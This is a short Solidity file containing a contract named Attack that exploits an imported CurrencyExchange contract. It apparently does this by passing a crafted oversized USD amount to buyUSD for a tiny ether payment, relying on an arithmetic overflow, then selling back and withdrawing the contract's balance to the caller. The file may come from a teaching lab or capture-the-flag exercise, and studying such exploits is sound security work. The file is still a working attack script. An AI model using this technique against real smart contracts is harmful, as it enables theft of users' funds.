// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./CurrencyExchange.sol";


contract Attack {
    CurrencyExchange exch;

    constructor(address _addr) public payable {
        exch = CurrencyExchange(_addr);
    }

    function attackUSD() public payable {
        // Wei value: 415992086870360064
        // USD amount: 231584178474632390847141970017375815706539969331281128078916000
        exch.buyUSD{ value: 415992086870360064  }(231584178474632390847141970017375815706539969331281128078916000);
        exch.sellUSD(2000);
    }

    function sellUSD(uint amount) public {
        exch.sellUSD(amount);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getFunds() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {
    }    
}